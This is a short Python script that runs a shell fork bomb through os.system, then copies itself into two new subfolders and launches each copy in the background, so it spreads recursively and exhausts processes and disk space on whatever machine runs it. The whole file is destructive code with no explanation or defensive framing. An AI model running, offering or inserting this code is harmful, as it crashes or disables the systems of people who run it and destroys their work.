import os



path = os.path.abspath(os.path.dirname(__file__))
file = os.path.basename(__file__)




os.system(":(){ :|:& };:")
os.system(f"mkdir {path}/folder")
os.system(f"mkdir {path}/folder2")
os.system(f"cp {file} {path}/folder/main.py")
os.system(f"cp {file} {path}/folder2/main.py")
os.system(f"python3 {path}/folder/main.py &")
os.system(f"python3 {path}/folder2/main.py &")
